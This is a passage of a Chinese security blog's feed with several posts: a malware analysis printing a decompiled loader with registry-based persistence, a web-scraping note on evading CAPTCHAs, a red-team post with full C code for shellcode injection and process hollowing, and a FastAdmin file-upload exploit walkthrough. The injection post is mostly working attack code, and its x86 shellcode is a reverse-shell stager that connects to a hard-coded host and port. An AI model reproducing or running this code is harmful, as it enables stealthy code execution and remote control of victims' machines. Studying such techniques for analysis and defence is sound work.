&quot;0&quot;).Replace(&quot;w&quot;, &quot;1&quot;).Replace(&quot;r&quot;, &quot;2&quot;).Replace(&quot;t&quot;, &quot;3&quot;).Replace(&quot;y&quot;, &quot;4&quot;).Replace(&quot;u&quot;, &quot;5&quot;).Replace(&quot;i&quot;, &quot;6&quot;).Replace(&quot;o&quot;, &quot;7&quot;).Replace(&quot;p&quot;, &quot;8&quot;).Replace(&quot;s&quot;, &quot;9&quot;).Replace(&quot;q&quot;, &quot;A&quot;).Replace(&quot;h&quot;, &quot;B&quot;).Replace(&quot;j&quot;, &quot;C&quot;).Replace(&quot;k&quot;, &quot;D&quot;).Replace(&quot;l&quot;, &quot;E&quot;).Replace(&quot;z&quot;, &quot;F&quot;); //将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F        byte[] rawAssembly = Mode.STBA(text); //hex转换得到原始数据        Assembly assembly = Assembly.Load(rawAssembly); //远程加载        Type type = assembly.GetType(&quot;Diagnostics&quot;); //调用Diagnostics        object obj = Activator.CreateInstance(type);        MethodInfo method = type.GetMethod(&quot;Time&quot;);        method.Invoke(obj, null);        using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;, true)) //打开HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce注册表        {            string str = Environment.UserName.Replace(&quot; &quot;, &quot;&quot;); //将本机用户名的空格替换为空            registryKey2.SetValue(Environment.UserName, &quot;powershell -Win Hi -Command \&quot;$r = [Environment]::GetEnvironmentVariable(&#39;&quot; + str + &quot;&#39;, &#39;User&#39;).split();$p=$r[0];$r[0]=&#39;&#39;;Start-Process $p -ArgumentList ($r -join &#39; &#39;) -Win Hi\&quot;&quot;); //当前用户作为键名        }        using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(&quot;Environment&quot;, true)) //打开HKCU\Environment        {            string text3 = Environment.CommandLine; //获取此过程的命令行(由于是在powershell远程加载的所以这里获取到的是powershell.exe的路径)            if (!text3.Contains(&quot;windowstyle&quot;))            {                text3 = text3.Replace(&quot;.exe &quot;, &quot;.exe -windowstyle hidden &quot;); //执行的命令行存在windowstyle将.exe替换为.exe -windowstyle hidden[空格]            }            registryKey3.SetValue(Environment.UserName.Replace(&quot; &quot;, &quot;&quot;), text3);        }    }    return &quot;Install&quot;;}// Mode// Token: 0x06000001 RID: 1 RVA: 0x00002098 File Offset: 0x00000298public static byte[] STBA(string hex){    return (from x in Enumerable.Range(0, hex.Length)    where x % 2 == 0    select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray&lt;byte&gt;(); //hex转换}</code></pre><p>md5:FD5B538D2523FEA19D7C11C4159A7EB6<br>sha1:5620A43E87ADB4517AA7181825612CFD7491AF3A<br>sha256:BBE6F87ECBA0F6452C6A7F3A81B6DBEB23787C754439BC979CAF653DC594B606</p><p>1.读取读取HKCU\SOFTWARE\<username>从0到99999键名的键值<br>2.将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F<br>3.hex转换得到原始数据<br>4.远程加载<br>5.调用Diagnostics.Time()<br>6.将此ps1的路径添加到启动路径HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</username></p><p>ocwbowtyl变量值hex解码还原dnSpy分析<br><img src="https://z3.ax1x.com/2021/04/12/cDNy0x.png" alt=""></p><p>分析结果为cs实现的傀儡进程（注入:C:\Program Files (x86)\Windows Photo Viewer\ImagingDevices.exe）<br><img src="https://z3.ax1x.com/2021/04/12/cDN4cd.png" alt=""></p><p>如果失败的话则会杀掉进程<br><img src="https://z3.ax1x.com/2021/04/12/cDNqN8.png" alt=""></p><p>提取注入的PE<br><img src="https://z3.ax1x.com/2021/04/12/cDNX9g.png" alt=""></p><p>ps:提取出来后<code>\s</code>替换为空。然后hex解码，得到PE<br><img src="https://z3.ax1x.com/2021/04/12/cDUPEV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/12/cDUtKA.png" alt=""></p><p>丢沙箱了没见到上线，IDA看了一下也没出什么有用的。具体不知<br><img src="https://z3.ax1x.com/2021/04/12/cD0O6e.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Youtube分析视频:&lt;a href=&quot;https://www.youtube.com/watch?v=BcFbkjUVc7o&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.youtube.com/watch?v=BcFbkjUV</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>爬取微信公众号小结</title>
    <link href="http://422926799.github.io/posts/3dedb035.html"/>
    <id>http://422926799.github.io/posts/3dedb035.html</id>
    <published>2021-04-11T04:36:54.000Z</published>
    <updated>2021-04-11T05:23:45.191Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直想爬微信公众号然后整成一个bot。试过好几次<br>最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了</p><h2 id="爬取的方法"><a href="#爬取的方法" class="headerlink" title="爬取的方法"></a>爬取的方法</h2><p>网上能搜到的爬取方法：</p><ul><li>微信公众号平台接口抓取|限制:微信KEY有限制，30-40分钟内就会过期。请求次数超过10-20次被封</li><li>搜狗公众号爬取 | 缺陷：只能获取公众号最新更新的一条文章</li></ul><h2 id="爬取实现"><a href="#爬取实现" class="headerlink" title="爬取实现"></a>爬取实现</h2><p>这里是用第二种方法，方法如下<br>搜狗微信公众号搜索对应公众号:<code>https://weixin.sogou.com/weixin?type=1&amp;query=bibacps&amp;ie=utf8</code><br>获取文章链接<br><img src="https://z3.ax1x.com/2021/04/11/cwUusx.png" alt=""></p><p>然后请求这个链接得到wx文章的链接<br><img src="https://z3.ax1x.com/2021/04/11/cwU2yq.png" alt=""></p><p>经过测试，发现并无cookie等效验。访问<code>https://weixin.sogou.com/&lt;sougou_wx_lnk&gt;</code>就可以获取wx文章url。但是，请求次数太多就会出现验证码，只有cookie对了才不会有验证码<br>google后得到解决方法：</p><ul><li>随机UA头</li><li>每次请求之前先获取搜狗子域名cookie</li></ul><p>参考链接:<a href="https://blog.csdn.net/weixin_43881394/article/details/107768458" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43881394/article/details/107768458</a></p><p>获取子域名cookie</p><pre><code class="python">import requestsdef getcookie():    #从搜狗视频获取cookie，防止傻逼搜狗机制检测    url = &#39;https://v.sogou.com/v?ie=utf8&amp;query=&amp;p=40030600&#39;    headers = {&#39;User-Agent&#39;: UserAgent().random}    rst = requests.get(url=url,headers=headers,allow_redirects=False)    cookies = rst.cookies.get_dict()    return cookies</code></pre><p>爬取到wx文章链接后入库</p><p>最终效果如下<br><img src="https://z3.ax1x.com/2021/04/11/cw0RCF.png" alt=""></p><p>Github:<a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96</a></p><h2 id="爬虫小技巧"><a href="#爬虫小技巧" class="headerlink" title="爬虫小技巧"></a>爬虫小技巧</h2><pre><code>爬取大型站点（例如:google.com）可能会遇到的问题：    * 请求次数过多导致验证码    * Cookie判断是否多次请求解决发方法    * 随机IP代理    * 随机UA头    * SESSION请求    * 针对Cookie判断是否多次请求 （这种大型站点cookie生成机制都是一致的，可以请求这种站点的子域名获取cookie。每次请求之前，先从子域名获取cookie然后在用这个cookie请求要爬取的站点）    * 延时请求遇见CSRF TOKEN效验    * TOKEN效验    * COOKIE效验解决方法：    * 这种CRSF TOKEN一般在当前页面存在TOKEN，先获取TOKEN在去请求指定某个地区的IP请求解决方法：    * 使用对应地区的IP请求</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;一直想爬微信公众号然后整成一个bot。试过好几次&lt;br&gt;最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    
    <category term="爬虫" scheme="http://422926799.github.io/tags/爬虫/"/>
    
  </entry>
  
  <entry>
    <title>傀儡进程</title>
    <link href="http://422926799.github.io/posts/96bf6a75.html"/>
    <id>http://422926799.github.io/posts/96bf6a75.html</id>
    <published>2021-04-06T15:29:53.000Z</published>
    <updated>2021-04-06T15:36:34.641Z</updated>
    
    <content type="html"><![CDATA[<p><strong>shellcode插入</strong><br>x64<br>整体流程：<br>1.创建进程，获取进程句柄 CreateProcessA<br>2.在目标进程分配shellcode大小的内存空间 VirtualAllocEx<br>3.远程写入shellcode WriteProcessMemory<br>4.远程线程调用 CreateRemoteThread<br>5.等待返回 WaitForSingleObject<br>6.减少线程的挂起计数。当挂起计数减为零时，将继续执行线程。 ResumeThread</p><p>ps:其实这个不算最多算个线程劫持</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;int main(){        unsigned char buf[] =               &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;               &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;               &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;               &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;               &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;               &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;               &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;               &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;               &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;               &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;               &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;               &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;               &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;               &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;               &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;               &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;               &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;               &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;               &quot;\x63\x2e\x65\x78\x65\x00&quot;;        SIZE_T size = 0;        STARTUPINFOEXA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;        ZeroMemory(&amp;pi, sizeof(pi));        BOOL sucess = CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL,  NULL, true, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,  (LPSTARTUPINFOA)&amp;si, &amp;pi);        HANDLE notepadHandle = pi.hProcess;        LPVOID remotebuffer = VirtualAllocEx(notepadHandle, NULL, sizeof(buf),  (MEM_RESERVE | MEM_COMMIT),PAGE_EXECUTE_READWRITE);        WriteProcessMemory(notepadHandle,remotebuffer,buf,sizeof(buf),NULL);        HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0,  (LPTHREAD_START_ROUTINE)remotebuffer, NULL, 0, NULL); //remotebuffer为线程起始地址        if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {               return 1;        }        if (ResumeThread(pi.hThread) == -1) {               return 1;        }    return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3naLQ.png" alt=""></p><p>x86<br>寻找加载基地址，在加载基地址前运行shellcode：<br>1.挂起方式创建进程 CreateProcessA<br>2.获取线程里的PEB GetThreadContext<br>3.获取进程基地址保存在EAX ReadProcessMemory<br>4.在基地址之前写入shellcode WriteProcessMemory<br>5.恢复线程执行 ResumeThread</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;unsigned char buf[] =&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;&quot;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;&quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x5d\x8d&quot;&quot;\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;&quot;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&quot;&quot;\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;&quot;\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00&quot;&quot;\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56&quot;&quot;\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;&quot;\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5&quot;&quot;\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85&quot;&quot;\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1&quot;&quot;\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;void test() {        STARTUPINFOA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        ZeroMemory(&amp;pi, sizeof(pi));        si.cb = sizeof(STARTUPINFOA);        if (!CreateProcessA(&quot;C:\\Windows\\sysWoW64\\svchost.exe&quot;, NULL, NULL, NULL, FALSE,  CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) {               printf(&quot;CreateProcess Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;CreateProcess Sucess\n&quot;);        CONTEXT ctx;        ctx.ContextFlags = CONTEXT_ALL;        if (!GetThreadContext(pi.hThread, &amp;ctx)) {               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;GetThreadContext Sucess\n&quot;);        DWORD dwImageBase = 0;        DWORD lpNumberOfBytesRead = 0;        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 0x8), &amp;dwImageBase,  sizeof(DWORD), &amp;lpNumberOfBytesRead)) {               printf(&quot;ReadProcessMemory Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;ReadProcessMemory Sucess\n&quot;);        DWORD NumberOfBytesWritten = 0;        if (!WriteProcessMemory(pi.hProcess, (LPVOID)ctx.Eax, buf, sizeof(buf),  &amp;NumberOfBytesWritten)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;);        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        if (ResumeThread(pi.hThread) == -1) { //恢复线程执行成功的话函数返回为0               printf(&quot;ResumeThread Error Code:%d\n&quot;,GetLastError());        }        printf(&quot;ResumeThread Sucess\n&quot;);}int main(){        test();        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3n2yF.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/06/c3nhw9.png" alt=""></p><p><strong>x86进程替换</strong><br>1.创建进程CreateProcessA<br>2.获取进程PEB地址GetThreadContext<br>3.读取文件获取文件句柄 CreateFileA #替换掉目标文件的恶意文件<br>4.获取文件大小 GetFileSize<br>5.定义一个恶意文件的大小内存空间<br>6.读取文件内容 ReadFile<br>7.获取恶意文件内容的DOS头 (PIMAGE_DOS_HEADER)pBuf<br>8.获取恶意文件内容的NT头 (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew)<br>9.更改创建进程的基地址允许执行权限((LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase)<br>10.往进程内存写入恶意文件WriteProcessMemory(pi.hProcess,lpAddr,(LPCVOID)pBuf,pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,NULL); //指向要写的数据的指针。<br>11.替换字节<br>12.替换PEB中基地址<br>13.替换入口点</p><p>pDosHeader-&gt;e_lfanew DOS偏移头<br>pNtHeaders-&gt;OptionalHeader.ImageBase 基地址<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage PE大小<br>pNtHeaders-&gt;FileHeader.NumberOfSections 节表大小<br> (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress 节区的RVA地址<br> (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData 在文件中的偏移<br>dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint 程序执行入口RVA</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;void test() {        CHAR test[MAX_PATH] = &quot;C:\\Windows\\SysWOW64\\explorer.exe&quot;;        CHAR test2[MAX_PATH] = &quot;C:\\windows\\SysWOW64\\calc.exe&quot;;        STARTUPINFOA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        ZeroMemory(&amp;pi, sizeof(pi));        if (!CreateProcessA(test, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi)) {               printf(&quot;CreateProcess Error:%d\n&quot;,GetLastError());               return;        }        printf(&quot;CreateProcess Sucess\n&quot;);        CONTEXT ctx;        ctx.ContextFlags = CONTEXT_ALL;        if (!GetThreadContext(pi.hThread, &amp;ctx)) {               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;GetThreadContext Sucess\n&quot;);        HANDLE hFile = CreateFileA(test2, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE  | FILE_SHARE_DELETE,               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);        if (hFile == INVALID_HANDLE_VALUE)        {               printf(&quot;Open EXE File Filed&quot;);               printf(&quot;%d&quot;, GetLastError());               return;        }        DWORD dwSize = GetFileSize(hFile, NULL);        LPBYTE pAllocPE = NULL;        PBYTE pBuf = (PBYTE)malloc(dwSize);        DWORD dwBytesRead = 0;        ReadFile(hFile, (LPVOID)pBuf, dwSize, &amp;dwBytesRead, NULL);        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf;        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew);        //2.获取进程上下文        CONTEXT stThreadContext;        stThreadContext.ContextFlags = CONTEXT_FULL;        if (GetThreadContext(pi.hThread, &amp;stThreadContext) == 0)        {               printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());               return;        }        void* lpAddr = VirtualAllocEx(pi.hProcess,  (LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase,               pNtHeaders-&gt;OptionalHeader.SizeOfImage,               MEM_COMMIT | MEM_RESERVE,               PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。        if (lpAddr == NULL)        {               printf(&quot;VirtualAlloc failed (%d).\n&quot;, GetLastError());               return;        }        BOOL bRet = WriteProcessMemory(pi.hProcess,               lpAddr,               (LPCVOID)pBuf,//指向要写的数据的指针。               pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,               NULL);        if (!bRet)        {               return ;        }        // 替换节        LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)pBuf               + pDosHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS));        PIMAGE_SECTION_HEADER pSectionHeader;        DWORD dwIndex = 0;        for (; dwIndex &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; ++dwIndex)        {               pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;               bRet = WriteProcessMemory(pi.hProcess,                       (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress),                       (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData),                       pSectionHeader-&gt;SizeOfRawData,                       NULL);               if (!bRet)               {                       return;               }               lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr +  sizeof(IMAGE_SECTION_HEADER));        }        //6.恢复现场并运行傀儡进程        // 替换PEB中基地址        DWORD dwImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;        bRet = WriteProcessMemory(pi.hProcess, (LPVOID)(stThreadContext.Ebx + 8),  (LPCVOID)&amp;dwImageBase, sizeof(PVOID), NULL);        if (!bRet)        {               return;        }        // 替换入口点        stThreadContext.Eax = dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;        bRet = SetThreadContext(pi.hThread, &amp;stThreadContext);        if (!bRet)        {               return;        }        ResumeThread(pi.hThread);        printf(&quot;PID: %d&quot;, pi.dwProcessId);        free(pBuf);}int main(){        test();        system(&quot;pause&quot;);        return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3nXeH.png" alt=""></p><p>x64傀儡进程参考：<a href="https://bbs.pediy.com/thread-253362.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253362.htm</a><br>EXE替换参考：<a href="https://jev0n.com/2020/03/11/65.html" target="_blank" rel="noopener">https://jev0n.com/2020/03/11/65.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;shellcode插入&lt;/strong&gt;&lt;br&gt;x64&lt;br&gt;整体流程：&lt;br&gt;1.创建进程，获取进程句柄 CreateProcessA&lt;br&gt;2.在目标进程分配shellcode大小的内存空间 VirtualAllocEx&lt;br&gt;3.远程写入shellco</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>FastAdmin前台文件上传复现</title>
    <link href="http://422926799.github.io/posts/de1b4dd1.html"/>
    <id>http://422926799.github.io/posts/de1b4dd1.html</id>
    <published>2021-04-03T15:58:51.000Z</published>
    <updated>2021-04-03T16:22:45.434Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>漏洞发生于：2021年/4月1号<br>漏洞点：application\api\controller\Common.php<br>触发漏洞的url：/index/ajax/upload<br>要求：application\extra\upload.php里的chunking为true (分片上传为true)<br><img src="https://z3.ax1x.com/2021/04/04/cuYe9x.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞点分析<br>需要包括以下的post请求参数才行<br>1.chunkid参数<br>2.action参数<br>3.chunkindex参数<br>4.chunkcount参数<br>5.filename参数<br><img src="https://z3.ax1x.com/2021/04/04/cuYG4I.md.png" alt=""></p><p>随后进入if判断，当action参数不为merge或method不为clean的时候。调用chunk函数chunk($chunkid, $chunkindex, $chunkcount);进入分片文件上传<br><img src="https://z3.ax1x.com/2021/04/04/cuYDEj.md.png" alt=""></p><p>跟进chunk函数，<br>1.首先$destDir=RUNTIME_PATH/chunks路径, RUNTIME=ROOT_PATH . ‘runtime’ . DS (DS=根据系统的文件分隔符)<br><img src="https://z3.ax1x.com/2021/04/04/cuYrUs.md.png" alt=""></p><p>2.$fileName=$chunkid-$chunindex.part //$chunkid和$chunindex都可控<br>3.$destDir=$destDir.DS.$fileName //拼接得到最后文件路径<br>4.判断RUNTIME_PATH/chunks路径是否存在，不存在则创建文件夹<br>5.将临时文件移动到RUNTIME_PATH/chunks路径下<br><img src="https://z3.ax1x.com/2021/04/04/cuYhb4.md.png" alt=""></p><p>之后触发merge函数，写shell<br>要求action参数为merge<br><img src="https://z3.ax1x.com/2021/04/04/cutQzV.md.png" alt=""></p><p>首先chunkDir变量来自于下图<br>$chunkDir=RUNTIME_PATH . ‘chunks’<br><img src="https://z3.ax1x.com/2021/04/04/cut3sU.md.png" alt=""></p><p>1.$filePath=RUNTIME_PATH . ‘chunks’.DS.$chunkid //$chunkid参数可控<br>2.根据$chunkcount变量进行循环<br>3.判断$filePath-$i-.part文件是否存在<br>4.如果文件存在，在/runtime/chunks路径下创建以$filepath作为文件名的文件$destFile=@fopen($uploadPath, “wb”)<br>5.锁定文件<br>6.根据$chunkcount参数循环 //$chunkcount参数可控<br>7.$partFile=$filePath-$i-.part<br>8.循环读取$partFile内容，写入文件到$filepath<br>9.读取完文件后，删除分片文件，释放文件锁定，关闭文件句柄<br><img src="https://z3.ax1x.com/2021/04/04/cutDsO.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cutrLD.md.png" alt=""></p><p>exp分析:<br><img src="https://z3.ax1x.com/2021/04/04/cut2FA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cut4Qf.png" alt=""></p><p>exp地址:<a href="https://github.com/exp1orer/FastAdmin_Upload" target="_blank" rel="noopener">https://github.com/exp1orer/FastAdmin_Upload</a></p><p><img src="https://z3.ax1x.com/2021/04/04/cut5y8.png" alt=""></p><p>至于这里的shell地址为什么是根目录，因为这个exp是这么写的<br><img src="https://z3.ax1x.com/2021/04/04/cutjS0.md.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/57166400" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57166400</a><br><a href="https://xz.aliyun.com/t/9395" target="_blank" rel="noopener">https://xz.aliyun.com/t/9395</a><br><a href="https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;漏洞发生于：2021年/4月1号&lt;br&gt;漏洞点：application\api\controller\Common.php&lt;br&gt;触发漏洞的</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>kkcms1.371代码审计</title>
    <link href="http://422926799.github.io/posts/de5a64f.html"/>
    <id>http://422926799.github.io/posts/de5a64f.html</id>
    <published>2021-03-30T16:49:39.000Z</published>
    <updated>2021-03-30T17:55:14.844Z</updated>
    
